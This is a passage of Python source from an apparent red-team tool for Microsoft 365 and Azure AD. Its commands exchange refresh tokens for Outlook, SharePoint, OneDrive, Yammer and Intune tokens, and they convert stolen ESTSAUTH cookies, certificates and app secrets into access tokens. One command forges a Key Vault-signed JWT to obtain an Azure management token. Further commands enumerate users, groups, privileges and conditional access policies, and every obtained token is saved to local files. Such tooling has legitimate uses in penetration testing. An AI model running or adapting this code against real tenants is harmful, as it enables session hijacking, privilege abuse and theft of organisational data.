            "client_id": client_id,
            "grant_type": "refresh_token",
            "refresh_token": refresh_token,
            "scope": scope
        }

        if args.use_cae:
            claims = json.dumps({
                "access_token": {
                    "xms_cc": {
                        "values": ["cp1"]
                    }
                }
            }, separators=(',', ':'))
            data["claims"] = claims

        try:
            response = requests.post(auth_url, data=data, headers=headers)
            response.raise_for_status()
            print_green("[+] Token Obtained!\n")

            token_json = response.json()
            for key, value in token_json.items():
                print(f"[*] {key}: {value}")

            file_path = "officemanagement_tokens.txt"
            with open(file_path, 'a') as writer:
                writer.write(f"[+] Token Obtained! ({datetime.now()})\n")
                for key, value in token_json.items():
                    writer.write(f"[*] {key}: {value}\n")
                writer.write("\n")

            print_green(f"\n[+] Token information written to '{file_path}'.")

        except requests.exceptions.RequestException as e:
            print_red(f"[-] Failed to get Office Management token: {str(e)}")
            print_red(response.text)
        print("=" * 80)

    # invoke-refreshtooutlooktoken
    elif args.command and args.command.lower() == "invoke-refreshtooutlooktoken":
        if not args.tenant:
            print_red("[-] Error: --tenant argument is required for Invoke-RefreshToOutlookToken command")
            return

        print_yellow("\n[*] Invoke-RefreshToOutlookToken")
        print("=" * 80)
        user_agent = get_user_agent(args)
        client_id = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
        refresh_token = access_token
        resource = "https://outlook.office365.com/"
        auth_url = f"https://login.microsoftonline.com/{args.tenant}/oauth2/token?api-version=1.0"
        scope = "openid"

        headers = {
            "User-Agent": user_agent
        }

        data = {
            "resource": resource,
            "client_id": client_id,
            "grant_type": "refresh_token",
            "refresh_token": refresh_token,
            "scope": scope
        }

        if args.use_cae:
            claims = json.dumps({
                "access_token": {
                    "xms_cc": {
                        "values": ["cp1"]
                    }
                }
            }, separators=(',', ':'))
            data["claims"] = claims

        try:
            response = requests.post(auth_url, data=data, headers=headers)
            response.raise_for_status()
            print_green("[+] Token Obtained!\n")

            token_json = response.json()
            for key, value in token_json.items():
                print(f"[*] {key}: {value}")

            file_path = "outlook_tokens.txt"
            with open(file_path, 'a') as writer:
                writer.write(f"[+] Token Obtained! ({datetime.now()})\n")
                for key, value in token_json.items():
                    writer.write(f"[*] {key}: {value}\n")
                writer.write("\n")

            print_green(f"\n[+] Token information written to '{file_path}'.")

        except requests.exceptions.RequestException as e:
            print_red(f"[-] Failed to get Outlook token: {str(e)}")
            print_red(response.text)
        print("=" * 80)

    # invoke-refreshtosubstratetoken
    elif args.command and args.command.lower() == "invoke-refreshtosubstratetoken":
        if not args.tenant:
            print_red("[-] Error: --tenant argument is required for Invoke-RefreshToSubstrateToken command")
            return

        print_yellow("\n[*] Invoke-RefreshToSubstrateToken")
        print("=" * 80)
        user_agent = get_user_agent(args)
        client_id = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
        refresh_token = access_token
        resource = "https://substrate.office.com/"
        auth_url = f"https://login.microsoftonline.com/{args.tenant}/oauth2/token?api-version=1.0"
        scope = "openid"

        headers = {
            "User-Agent": user_agent
        }

        data = {
            "resource": resource,
            "client_id": client_id,
            "grant_type": "refresh_token",
            "refresh_token": refresh_token,
            "scope": scope
        }

        if args.use_cae:
            claims = json.dumps({
                "access_token": {
                    "xms_cc": {
                        "values": ["cp1"]
                    }
                }
            }, separators=(',', ':'))
            data["claims"] = claims

        try:
            response = requests.post(auth_url, data=data, headers=headers)
            response.raise_for_status()
            print_green("[+] Token Obtained!\n")

            token_json = response.json()
            for key, value in token_json.items():
                print(f"[*] {key}: {value}")

            file_path = "substrate_tokens.txt"
            with open(file_path, 'a') as writer:
                writer.write(f"[+] Token Obtained! ({datetime.now()})\n")
                for key, value in token_json.items():
                    writer.write(f"[*] {key}: {value}\n")
                writer.write("\n")

            print_green(f"\n[+] Token information written to '{file_path}'.")

        except requests.exceptions.RequestException as e:
            print_red(f"[-] Failed to get Substrate token: {str(e)}")
            print_red(response.text)
        print("=" * 80)

    # invoke-refreshtoyammertoken
    elif args.command and args.command.lower() == "invoke-refreshtoyammertoken":
        if not args.tenant:
            print_red("[-] Error: --tenant argument is required for Invoke-RefreshToYammerToken command")
            return

        print_yellow("\n[*] Invoke-RefreshToYammerToken")
        print("=" * 80)
        user_agent = get_user_agent(args)
        client_id = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
        refresh_token = access_token
        resource = "https://www.yammer.com/"
        auth_url = f"https://login.microsoftonline.com/{args.tenant}/oauth2/token?api-version=1.0"
        scope = "openid"

        headers = {
            "User-Agent": user_agent
        }

        data = {
            "resource": resource,
            "client_id": client_id,
            "grant_type": "refresh_token",
            "refresh_token": refresh_token,
            "scope": scope
        }

        if args.use_cae:
            claims = json.dumps({
                "access_token": {
                    "xms_cc": {
                        "values": ["cp1"]
                    }
                }
            }, separators=(',', ':'))
            data["claims"] = claims
            
        try:
            response = requests.post(auth_url, data=data, headers=headers)
            response.raise_for_status()
            print_green("[+] Token Obtained!\n")

            token_json = response.json()
            for key, value in token_json.items():
                print(f"[*] {key}: {value}")

            file_path = "yammer_tokens.txt"
            with open(file_path, 'a') as writer:
                writer.write(f"[+] Token Obtained! ({datetime.now()})\n")
                for key, value in token_json.items():
                    writer.write(f"[*] {key}: {value}\n")
                writer.write("\n")

            print_green(f"\n[+] Token information written to '{file_path}'.")

        except requests.exceptions.RequestException as e:
            print_red(f"[-] Failed to get Yammer token: {str(e)}")
            print_red(response.text)
        print("=" * 80)

    # invoke-refreshtointuneenrollmenttoken
    elif args.command and args.command.lower() == "invoke-refreshtointuneenrollmenttoken":
        if not args.tenant:
            print_red("[-] Error: --tenant argument is required for Invoke-RefreshToIntuneEnrollment command")
            return

        print_yellow("\n[*] Invoke-RefreshToIntuneEnrollment")
        print("=" * 80)
        user_agent = get_user_agent(args)
        client_id = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
        refresh_token = access_token
        resource = "https://enrollment.manage.microsoft.com/"
        auth_url = f"https://login.microsoftonline.com/{args.tenant}/oauth2/token?api-version=1.0"
        scope = "openid"

        headers = {
            "User-Agent": user_agent
        }

        data = {
            "resource": resource,
            "client_id": client_id,
            "grant_type": "refresh_token",
            "refresh_token": refresh_token,
            "scope": scope
        }

        try:
            response = requests.post(auth_url, data=data, headers=headers)
            response.raise_for_status()
            print_green("[+] Token Obtained!\n")
            
            token_json = response.json()
            for key, value in token_json.items():
                print(f"[*] {key}: {value}")

            file_path = "intune_tokens.txt"
            with open(file_path, 'a') as writer:
                writer.write(f"[+] Token Obtained! ({datetime.now()})\n")
                for key, value in token_json.items():
                    writer.write(f"[*] {key}: {value}\n")
                writer.write("\n")

            print_green(f"\n[+] Token information written to '{file_path}'.")

        except requests.exceptions.RequestException as e:
            print_red(f"[-] Failed to get Intune Enrollment token: {str(e)}")
            print_red(response.text)
        print("=" * 80)

    # invoke-refreshtoonedrivetoken
    elif args.command and args.command.lower() == "invoke-refreshtoonedrivetoken":
        if not args.tenant:
            print_red("[-] Error: --tenant argument is required for Invoke-RefreshToOneDriveToken command")
            return

        print_yellow("\n[*] Invoke-RefreshToOneDriveToken")
        print("=" * 80)
        user_agent = get_user_agent(args)
        client_id = "ab9b8c07-8f02-4f72-87fa-80105867a763"
        refresh_token = access_token
        resource = "https://officeapps.live.com/"
        auth_url = f"https://login.microsoftonline.com/{args.tenant}/oauth2/token?api-version=1.0"
        scope = "openid"

        headers = {
            "User-Agent": user_agent
        }

        data = {
            "resource": resource,
            "client_id": client_id,
            "grant_type": "refresh_token",
            "refresh_token": refresh_token,
            "scope": scope
        }

        if args.use_cae:
            claims = json.dumps({
                "access_token": {
                    "xms_cc": {
                        "values": ["cp1"]
                    }
                }
            }, separators=(',', ':'))
            data["claims"] = claims

        try:
            response = requests.post(auth_url, data=data, headers=headers)
            response.raise_for_status()
            print_green("[+] Token Obtained!\n")
            
            token_json = response.json()
            for key, value in token_json.items():
                print(f"[*] {key}: {value}")

            file_path = "onedrive_tokens.txt"
            with open(file_path, 'a') as writer:
                writer.write(f"[+] Token Obtained! ({datetime.now()})\n")
                for key, value in token_json.items():
                    writer.write(f"[*] {key}: {value}\n")
                writer.write("\n")

            print_green(f"\n[+] Token information written to '{file_path}'.")

        except requests.exceptions.RequestException as e:
            print_red(f"[-] Failed to get OneDrive token: {str(e)}")
            print_red(response.text)
        print("=" * 80)

    # invoke-refreshtosharepointtoken
    elif args.command and args.command.lower() == "invoke-refreshtosharepointtoken":
        if not args.tenant:
            print_red("[-] Error: --tenant argument is required for Invoke-RefreshToSharePointToken command")
            return

        print_yellow("\n[*] Invoke-RefreshToSharePointToken")
        print("=" * 80)
        user_agent = get_user_agent(args)
        client_id = "ab9b8c07-8f02-4f72-87fa-80105867a763"
        refresh_token = access_token
        
        try:
            sharepoint_tenant = input("\nEnter SharePoint Tenant Name: ").strip()
            use_admin = input("Use Admin Suffix '-admin' (yes/no): ").strip().lower() == 'yes'
            admin_suffix = '-admin' if use_admin else ''
            
        except KeyboardInterrupt:
            sys.exit()

        auth_url = f"https://login.microsoftonline.com/{args.tenant}/oauth2/token?api-version=1.0"
        resource = f"https://{sharepoint_tenant}{admin_suffix}.sharepoint.com"

        headers = {
            "User-Agent": user_agent
        }

        data = {
            "resource": resource,
            "client_id": client_id,
            "grant_type": "refresh_token",
            "refresh_token": refresh_token,
            "scope": "openid"
        }

        if args.use_cae:
            claims = json.dumps({
                "access_token": {
                    "xms_cc": {
                        "values": ["cp1"]
                    }
                }
            }, separators=(',', ':'))
            data["claims"] = claims

        try:
            response = requests.post(auth_url, data=data, headers=headers)
            response.raise_for_status()
            print_green("\n[+] Token Obtained!\n")
            
            token_json = response.json()
            for key, value in token_json.items():
                print(f"[*] {key}: {value}")

            file_path = "sharepoint_tokens.txt"
            with open(file_path, 'a') as writer:
                writer.write(f"[+] Token Obtained! ({datetime.now()})\n")
                for key, value in token_json.items():
                    writer.write(f"[*] {key}: {value}\n")
                writer.write("\n")

            print_green(f"\n[+] Token information written to '{file_path}'.")

        except requests.exceptions.RequestException as e:
            print_red(f"[-] Failed to get SharePoint token: {str(e)}")
            print_red(response.text)
        print("=" * 80)

    # invoke-certtoaccesstoken
    elif args.command and args.command.lower() == "invoke-certtoaccesstoken":
        if not args.tenant or not args.cert or not args.id:
            print_red("[-] Error: --tenant, --cert, and --id arguments are required for Invoke-CertToAccessToken command")
            return

        print_yellow("\n[*] Invoke-CertToAccessToken")
        print("=" * 80)
        tenant_id = args.tenant
        client_id = args.id
        cert_path = args.cert

        try:
            audience = f"https://login.microsoftonline.com/{tenant_id}/oauth2/v2.0/token"
            with open(cert_path, 'rb') as cert_file:
                pfx_data = cert_file.read()

            private_key, certificate, *_ = pkcs12.load_key_and_certificates(pfx_data, None, default_backend())
            # calculate x5t (X.509 cert SHA-1 thumbprint)
            fingerprint = certificate.fingerprint(hashes.SHA1())
            x5t = base64.urlsafe_b64encode(fingerprint).rstrip(b'=').decode('ascii')

            payload = {
                'sub': client_id,
                'nbf': datetime.now(timezone.utc),
                'exp': datetime.now(timezone.utc) + timedelta(minutes=120),
                'iat': datetime.now(timezone.utc),
                'iss': client_id,
                'aud': audience
            }

            private_key_pem = private_key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.TraditionalOpenSSL,
                encryption_algorithm=serialization.NoEncryption()
            )

            jwt_token = jwt.encode(payload, private_key_pem, algorithm='RS256', headers={'kid': fingerprint.hex().upper(), 'x5t': x5t})
            user_agent = get_user_agent(args)
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': user_agent
            }

            data = {
                'grant_type': 'client_credentials',
                'client_id': client_id,
                'client_assertion_type': 'urn:ietf:params:oauth:client-assertion-type:jwt-bearer',
                'client_assertion': jwt_token,
                'scope': 'https://graph.microsoft.com/.default'
            }

            try:
                response = requests.post(f"https://login.microsoftonline.com/{tenant_id}/oauth2/v2.0/token", headers=headers, data=data)
                response.raise_for_status()  

                print_green("[+] Token Obtained!\n")
                token_json = response.json()
                for key, value in token_json.items():
                    print(f"[*] {key}: {value}")

                file_path = "cert_tokens.txt"
                with open(file_path, 'a') as writer:
                    writer.write(f"[+] Token Obtained! ({datetime.now()})\n")
                    for key, value in token_json.items():
                        writer.write(f"[*] {key}: {value}\n")
                    writer.write("\n")
                print_green(f"\n[+] Token information written to '{file_path}'.")

            except requests.exceptions.RequestException as e:
                print_red(f"[-] Failed to get certificate access token: {str(e)}")
                print_red(response.text)

        except Exception as e:
            print_red(f"[-] Error loading .pfx file: {str(e)}")
        print("=" * 80)

    # invoke-estscookietoaccesstoken
    elif args.command and args.command.lower() == "invoke-estscookietoaccesstoken":
        if not args.tenant or not args.estsauthcookie:
            print_red("[-] Error: --tenant and --estsauthcookie are required for Invoke-ESTSCookieToAccessToken command")
            return

        print_yellow("\n[*] Invoke-ESTSCookieToAccessToken")
        print("=" * 80)
        user_agent = get_user_agent(args)

        try:
            client = input("\nEnter Client (MSTeams, MSEdge, AzurePowerShell): ").strip()
            if client == "":
                client_id = "1fec8e78-bce4-4aaf-ab1b-5451cc387264"
                print("Using Default Client: MSTeams")
            elif client == "MSTeams":
                client_id = "1fec8e78-bce4-4aaf-ab1b-5451cc387264"
            elif client == "MSEdge":
                client_id = "ecd6b820-32c2-49b6-98a6-444530e5a77a"
            elif client == "AzurePowerShell":
                client_id = "1950a258-227b-4e31-a9cf-717495945fc2"
            else:
                print_red(f"[-] Invalid client: {client}")
                print("=" * 80)
                sys.exit()

        except KeyboardInterrupt:
            sys.exit()

        print()
        resource = "https://graph.microsoft.com/"

        headers = {
            "User-Agent": user_agent
        }

        ests_auth_cookie = get_access_token(args.estsauthcookie)
        session = requests.Session()

        if ests_auth_cookie.startswith("ESTSAUTH="):
            session.cookies.set("ESTSAUTH", ests_auth_cookie.split("=", 1)[1], domain="login.microsoftonline.com")
        elif ests_auth_cookie.startswith("ESTSAUTHPERSISTENT="):
            session.cookies.set("ESTSAUTHPERSISTENT", ests_auth_cookie.split("=", 1)[1], domain="login.microsoftonline.com")
        else:
            print_red("[-] Invalid ESTS cookie format")
            print("=" * 80)
            sys.exit()

        state = str(uuid.uuid4())
        redirect_uri = "https://login.microsoftonline.com/common/oauth2/nativeclient"
        auth_url = f"https://login.microsoftonline.com/common/oauth2/authorize?{urlencode({'response_type': 'code', 'client_id': client_id, 'resource': resource, 'redirect_uri': redirect_uri, 'state': state})}"

        response = session.get(auth_url, headers=headers, allow_redirects=False)

        if response.status_code == 302:
            location = response.headers['Location']
            parsed_url = urlparse(location)
            query_params = parse_qs(parsed_url.query)
            
            if 'code' in query_params:
                refresh_token = query_params['code'][0]
            else:
                print_red("[-] Code not found in redirected URL path")
                print_red(f"    Requested URL: {auth_url}")
                print_red(f"    Response Code: {response.status_code}")
                print_red(f"    Response URI:  {location}")
                print("=" * 80)
                return None
        else:
            print_red("[-] Expected 302 redirect but received other status")
            print_red(f"[-] Requested URL: {auth_url}")
            print_red(f"[-] Response Code: {response.status_code}")
            print_red("[-] The request may require user interaction to complete, or the provided cookie is invalid")
            print("=" * 80)
            return None

        if refresh_token:
            token_url = "https://login.microsoftonline.com/common/oauth2/token"
            body = {
                "resource": resource,
                "client_id": client_id,
                "grant_type": "authorization_code",
                "redirect_uri": redirect_uri,
                "code": refresh_token,
                "scope": "openid"
            }

            if args.use_cae:
                claims = json.dumps({
                    "access_token": {
                        "xms_cc": {
                            "values": ["cp1"]
                        }
                    }
                }, separators=(',', ':'))
                body["claims"] = claims

            token_response = session.post(token_url, headers=headers, data=body)
            token_response_json = token_response.json()
            access_token = token_response_json.get('access_token')

            if access_token:
                print_green("[+] Token Obtained!\n")
                for key, value in token_response_json.items():
                    print(f"[*] {key}: {value}")

                file_path = "estscookie_tokens.txt"
                with open(file_path, 'a') as writer:
                    writer.write(f"[+] Token Obtained! ({datetime.now()})\n")
                    for key, value in token_response_json.items():
                        writer.write(f"[*] {key}: {value}\n")
                    writer.write("\n")
                print_green(f"\n[+] Token information written to '{file_path}'.")
                print("=" * 80)
            else:
                print_red("[-] Failed to obtain access token.")
                print("=" * 80)
                return None
        else:
            print_red("[-] Refresh token is missing.")
            print("=" * 80)
            return None        

    # invoke-appsecrettoaccesstoken
    elif args.command and args.command.lower() == "invoke-appsecrettoaccesstoken":
        if not args.tenant or not args.id or not args.secret:
            print_red("[-] Error: --tenant, --id, and --secret required for Invoke-AppSecretToAccessToken command")
            return
        
        print_yellow("\n[*] Invoke-AppSecretToAccessToken")
        print("=" * 80)
        
        tenant_id = args.tenant
        client_id = args.id
        client_secret = args.secret
        
        token_url = f"https://login.microsoftonline.com/{tenant_id}/oauth2/v2.0/token"
        token_data = {
            'grant_type': 'client_credentials',
            'client_id': client_id,
            'client_secret': client_secret,
            'scope': 'https://graph.microsoft.com/.default' # can change e.g. 'https://management.azure.com/.default' for Az
        }

        # check cae for client_credential grants
        
        user_agent = get_user_agent(args)
        headers = {
            "User-Agent": user_agent
        }
        
        try:
            token_response = requests.post(token_url, data=token_data, headers=headers)
            token_response.raise_for_status()
            token_json = token_response.json()
            
            print_green("[+] Token Obtained!\n")
            for key, value in token_json.items():
                print(f"[*] {key}: {value}")
            
            file_path = "appsecret_tokens.txt"
            with open(file_path, 'a') as writer:
                writer.write(f"[+] Token Obtained! ({datetime.now()})\n")
                for key, value in token_json.items():
                    writer.write(f"[*] {key}: {value}\n")
                writer.write("\n")
            print_green(f"\n[+] Token information written to '{file_path}'.")
        
        except requests.exceptions.RequestException as e:
            print_red(f"[-] Failed to get app secret token: {str(e)}")
            if 'token_response' in locals():
                print_red(token_response.text)
        
        print("=" * 80)

    # new-signedjwt
    elif args.command and args.command.lower() == "new-signedjwt":
        if not args.tenant or not args.id:
            print_red("[-] Error: --tenant and --id required for New-SignedJWT command")
            return

        print_yellow("\n[*] New-SignedJWT")
        print("=" * 80)
        try:
            kvURI = input("\nEnter Key Vault Certificate Identifier URL: ").strip()
        except KeyboardInterrupt:
            sys.exit()
        keyName = kvURI.split('/certificates/', 1)[-1].split('/', 1)[0]

        # cert details
        kv_uri = f"{kvURI.split('/certificates/')[0]}/certificates?api-version=7.3"

        headers = {
            "Authorization": f"Bearer {access_token}"
        }

        response = requests.get(kv_uri, headers=headers)
        response.raise_for_status()

        certs = response.json()
        cert_uri = next((c for c in certs['value'] if keyName in c['id']), None)

        if not cert_uri:
            raise Exception("Certificate not found.")

        cert_id = cert_uri['id']
        cert_uri_with_version = f"{cert_id}?api-version=7.3"

        response = requests.get(cert_uri_with_version, headers=headers)
        response.raise_for_status()

        certificate = response.json()
        x5t = certificate.get('x5t')
        kid = certificate.get('kid')

        print_green("\n[+] Certificate Details Obtained!")
        print(f"kid: {kid or 'N/A'}")
        print(f"x5t: {x5t or 'N/A'}")

        # create JWT
        print_green("\n[+] Forged JWT:")
        app_id = args.id
        audience = f"https://login.microsoftonline.com/{args.tenant}/oauth2/token"

        now = datetime.now(timezone.utc)
        jwt_expiration = int((now + timedelta(minutes=2)).timestamp())
        not_before = int(now.timestamp())

        jwt_header = {
            "x5t": x5t,
            "typ": "JWT",
            "alg": "RS256"
        }

        jwt_payload = {
            "exp": jwt_expiration,
            "sub": app_id,
            "nbf": not_before,
            "jti": str(uuid.uuid4()),
            "aud": audience,
            "iss": app_id
        }

        def base64url_encode(data):
            return base64.urlsafe_b64encode(data.encode('utf-8')).decode('utf-8').rstrip('=')

        # encode header and payload
        header_encoded = base64url_encode(json.dumps(jwt_header))
        payload_encoded = base64url_encode(json.dumps(jwt_payload))

        # construct unsigned JWT
        unsigned_jwt = f"{header_encoded}.{payload_encoded}"

        jwt_sha256_hash = hashlib.sha256(unsigned_jwt.encode()).digest()
        jwt_sha256_hash_b64 = base64.urlsafe_b64encode(jwt_sha256_hash).decode().rstrip('=')

        # sign JWT
        new_uri = f"{kid}/sign?api-version=7.3"
        user_agent = get_user_agent(args)
        headers = {
            "Authorization": f"Bearer {access_token}",
            "Accept": "application/json",
            "User-Agent": user_agent
        }
        request_body = {
            "alg": "RS256",
            "value": jwt_sha256_hash_b64
        }

        response = requests.post(new_uri, headers=headers, json=request_body)
        response.raise_for_status()
        signature = response.json()['value']

        signed_jwt = f"{unsigned_jwt}.{signature}"
        print(signed_jwt)

        # request azure management token
        jwt_login = f"https://login.microsoftonline.com/{args.tenant}/oauth2/v2.0/token"

        parameters = {
            "client_id": args.id,
            "client_assertion": signed_jwt,
            "client_assertion_type": "urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
            "scope": "https://management.azure.com/.default",
            "grant_type": "client_credentials"
        }

        response = requests.post(jwt_login, data=parameters)

        if not response.ok:
            print(f"[-] Error: {response.status_code} ({response.reason}). {response.text}")
        else:
            print_green("\n[+] Azure Management Token Obtained!")
            print(f"[*] Application ID: {args.id}")
            print(f"[*] Tenant ID: {args.tenant}")
            print("[*] Scope: https://management.azure.com/.default")

            response_json = response.json()
            for key, value in response_json.items():
                print(f"[*] {key}: {value}")
        print("=" * 80)


    ##########################
    # Post-Auth Enuemeration #
    ##########################

    # get-currentuser
    elif args.command and args.command.lower() == "get-currentuser":
        print_yellow("\n[*] Get-CurrentUser")
        print("=" * 80)
        api_url = "https://graph.microsoft.com/v1.0/me"

        if args.select:
            api_url += "?$select=" + args.select

        user_agent = get_user_agent(args)
        headers = {
            'Authorization': f'Bearer {access_token}',
            'User-Agent': user_agent
        }

        response = requests.get(api_url, headers=headers)
        if response.status_code == 200:
            response_json = response.json()

            for key, value in response_json.items():
                if key != "@odata.context":
                    print(f"{key}: {value}")

        else:
            print_red(f"[-] Failed to retrieve current user: {response.status_code}")
            print_red(response.text)
        print("=" * 80)

    # get-currentuseractivities
    elif args.command and args.command.lower() == "get-currentuseractivities":
        print_yellow("\n[*] Get-CurrentUserActivity")
        print("=" * 80)
        api_url = "https://graph.microsoft.com/v1.0/me/activities"
        if args.select:
            api_url += "?$select=" + args.select

        graph_api_get(access_token, api_url, args)
        print("=" * 80)
    
    # get-orginfo
    elif args.command and args.command.lower() == "get-orginfo":
        print_yellow("\n[*] Get-OrgInfo")
        print("=" * 80)
        api_url = "https://graph.microsoft.com/v1.0/organization"
        if args.select:
            api_url += "?$select=" + args.select

        graph_api_get(access_token, api_url, args)
        print("=" * 80)

    # get-domains
    elif args.command and args.command.lower() == "get-domains":
        print_yellow("\n[*] Get-Domains")
        print("=" * 80)
        api_url = "https://graph.microsoft.com/v1.0/domains"
        if args.select:
            api_url += "?$select=" + args.select

        graph_api_get(access_token, api_url, args)
        print("=" * 80)

    # get-user
    elif args.command and args.command.lower() == "get-user":
        print_yellow("\n[*] Get-User")
        print("=" * 80)
        api_url = "https://graph.microsoft.com/v1.0/users"
        if args.id:
            api_url = f"https://graph.microsoft.com/v1.0/users/{args.id}"
        if args.select:
            api_url += "?$select=" + args.select

        user_agent = get_user_agent(args)
        headers = {
            'Authorization': f'Bearer {access_token}',
            'User-Agent': user_agent
        }

        response = requests.get(api_url, headers=headers)
        if response.status_code == 200:
            response_json = response.json()
            if args.id:
                for key, value in response_json.items():
                    if key != "@odata.context":
                        print(f"{key}: {value}")
            else:
                if 'value' in response_json:
                    for user in response_json['value']:
                        for key, value in user.items():
                            print(f"{key}: {value}")
                        print()
                else:
                    print_red("[-] No users found or unexpected response format")
        else:
            print_red(f"[-] Failed to retrieve user(s): {response.status_code}")
            print_red(response.text)
        print("=" * 80)

    # get-userproperties
    if args.command and args.command.lower() == "get-userproperties":
        print_yellow("\n[*] Get-UserProperties")
        print("=" * 80)
        for p in properties:
            if not args.id:
                api_url = f"https://graph.microsoft.com/v1.0/me?$select={p}"
            else:
                api_url = f"https://graph.microsoft.com/v1.0/users/{args.id}?$select={p}"

            user_agent = get_user_agent(args)
            headers = {
                'Authorization': f'Bearer {access_token}',
                'User-Agent': user_agent
            }

            response = requests.get(api_url, headers=headers)

            if response.status_code == 200:
                response_json = response.json()
                print(f"{p}: {response_json.get(p, 'N/A')}")
            else:
                print_red(f"[-] Failed to retrieve {p}: {response.status_code}")
                print_red(response.text)
        print("=" * 80)

    # get-userprivileges
    elif args.command and args.command.lower() == "get-userprivileges":
        print_yellow("\n[*] Get-UserPrivileges")
        print("=" * 80)
        api_url = "https://graph.microsoft.com/v1.0/me/memberOf"
        if args.id:
            api_url = f"https://graph.microsoft.com/v1.0/users/{args.id}/memberOf"
        if args.select:
            api_url += "?$select=" + args.select

        graph_api_get(access_token, api_url, args)
        print("=" * 80)

    # get-usertransitivegroupmembership
    elif args.command and args.command.lower() == "get-usertransitivegroupmembership":
        print_yellow("\n[*] Get-UserTransitiveGroupMembership")
        print("=" * 80)
        api_url = "https://graph.microsoft.com/v1.0/me/transitiveMemberOf"
        if args.id:
            api_url = f"https://graph.microsoft.com/v1.0/users/{args.id}/transitiveMemberOf"
        if args.select:
            api_url += "?$select=" + args.select

        graph_api_get(access_token, api_url, args)
        print("=" * 80)

    # get-group
    elif args.command and args.command.lower() == "get-group":
        print_yellow("\n[*] Get-Group")
        print("=" * 80)
        api_url = "https://graph.microsoft.com/v1.0/groups"
        if args.id:
            api_url = f"https://graph.microsoft.com/v1.0/groups/{args.id}"
        if args.select:
            api_url += "?$select=" + args.select

        user_agent = get_user_agent(args)
        headers = {
            'Authorization': f'Bearer {access_token}',
            'User-Agent': user_agent
        }

        response = requests.get(api_url, headers=headers)
        if response.status_code == 200:
            response_json = response.json()
            if args.id:
                for key, value in response_json.items():
                    if key != "@odata.context":
                        print(f"{key}: {value}")
            else:
                if 'value' in response_json:
                    for user in response_json['value']:
                        for key, value in user.items():
                            print(f"{key}: {value}")
                        print()
                else:
                    print_red("[-] No users found or unexpected response format")
        else:
            print_red(f"[-] Failed to retrieve user(s): {response.status_code}")
            print_red(response.text)
        print("=" * 80)

    # get-groupmember
    elif args.command and args.command.lower() == "get-groupmember":
        if not args.id:
            print_red("[-] Error: --id argument is required for Get-GroupMember command")
            return
        print_yellow("\n[*] Get-GroupMember")
        print("=" * 80)
        api_url = f"https://graph.microsoft.com/v1.0/groups/{args.id}/members"
        if args.select:
            api_url += f"?$select={args.select}"
        user_agent = get_user_agent(args)
        headers = {
            'Authorization': f'Bearer {access_token}',
            'User-Agent': user_agent
        }
        response = requests.get(api_url, headers=headers)
        if response.status_code == 200:
            response_json = response.json()
            if 'value' in response_json and response_json['value']:
                for item in response_json['value']:
                    for key, value in item.items():
                        if key != "@odata.type":  
                            if isinstance(value, list):
                                print(f"{key} :")
                                for list_item in value:
                                    print(f"  - {list_item}")
                            elif isinstance(value, dict):
                                print(f"{key} :")
                                for sub_key, sub_value in value.items():
                                    print(f"  {sub_key} : {sub_value}")
                            else:
                                print(f"{key} : {value}")
                    print("\n")
            else:
                print_red("[-] Error: No members found in this group")
        else:
            print_red(f"[-] Failed to retrieve group members: {response.status_code}")
            print_red(response.text)
        print("=" * 80)

    # get-userapproleassignments
    elif args.command and args.command.lower() == "get-userapproleassignments":
        print_yellow("\n[*] Get-UserAppRoleAssignments")
        print("=" * 80)
        api_url = "https://graph.microsoft.com/v1.0/me/appRoleAssignments"
        if args.id:
            api_url = f"https://graph.microsoft.com/v1.0/users/{args.id}/appRoleAssignments"
        if args.select:
            api_url += "?$select=" + args.select

        graph_api_get(access_token, api_url, args)
        print("=" * 80)

    # get-conditionalaccesspolicy
    elif args.command and args.command.lower() == "get-conditionalaccesspolicy":
        if not args.id:
            print_red("[-] Error: --id argument is required for Get-ConditionalAccessPolicy command")
            return
        
        print_yellow("\n[*] Get-ConditionalAccessPolicy")
        print("=" * 80)
        api_url = f"https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies/{args.id}"
        if args.select:
            api_url += "?$select=" + args.select

        user_agent = get_user_agent(args)
        headers = {
            'Authorization': f'Bearer {access_token}',
            'User-Agent': user_agent
        }

        response = requests.get(api_url, headers=headers)
        if response.status_code == 200:
            response_json = response.json()

            for key, value in response_json.items():
                if key != "@odata.context":
                    print(f"{key}: {value}")

        else:
            print_red(f"[-] Failed to retrieve CAP: {response.status_code}")
            print_red(response.text)
        print("=" * 80)

    # get-application
    elif args.command and args.command.lower() == "get-application":
        if not args.id:
            print_red("[-] Error: --id <appid> argument is required for Get-Application command")
            return

        print_yellow("\n[*] Get-Application")
        print("=" * 80)
        api_url = f"https://graph.microsoft.com/beta/myorganization/applications(appId='{args.id}')" # app id
        #api_url = f"https://graph.microsoft.com/v1.0/applications/{args.id}" # object id
        if args.select:
            api_url += "?$select=" + args.select
        user_agent = get_user_agent(args)
        headers = {
            'Authorization': f'Bearer {access_token}',
            'User-Agent': user_agent
        }
        response = requests.get(api_url, headers=headers)

        if response.status_code == 200:
            response_json = response.json()

            def parse_roleids(content):
                soup = BeautifulSoup(content, 'html.parser')
                permissions = {}
                for h3 in soup.find_all('h3'):
                    permission_name = h3.get_text()
                    table = h3.find_next('table')
                    rows = table.find_all('tr')
                    application_id = rows[1].find_all('td')[1].get_text()
                    delegated_id = rows[1].find_all('td')[2].get_text()
                    application_description = rows[2].find_all('td')[1].get_text()
                    delegated_description = rows[2].find_all('td')[2].get_text()
                    application_consent = rows[4].find_all('td')[1].get_text() if len(rows) > 4 else "Unknown"
                    delegated_consent = rows[4].find_all('td')[2].get_text() if len(rows) > 4 else "Unknown"
                    permissions[application_id] = ('Application', permission_name, application_description, application_consent)
                    permissions[delegated_id] = ('Delegated', permission_name, delegated_description, delegated_consent)
                return permissions

            script_dir = os.path.dirname(os.path.abspath(__file__))
            file_path = os.path.join(script_dir, '.github', 'graphpermissions.txt')
            try:
                with open(file_path, 'r') as file:
                    content = file.read()
            except FileNotFoundError:
                print_red(f"\n[-] The file {file_path} does not exist.")
                sys.exit(1)
            except Exception as e:
                print_red(f"\n[-] An error occurred: {e}")
                sys.exit(1)

            permissions = parse_roleids(content)

            for key, value in response_json.items():
                if key == "requiredResourceAccess":
                    if value:
                        print_green(f"{key}:")
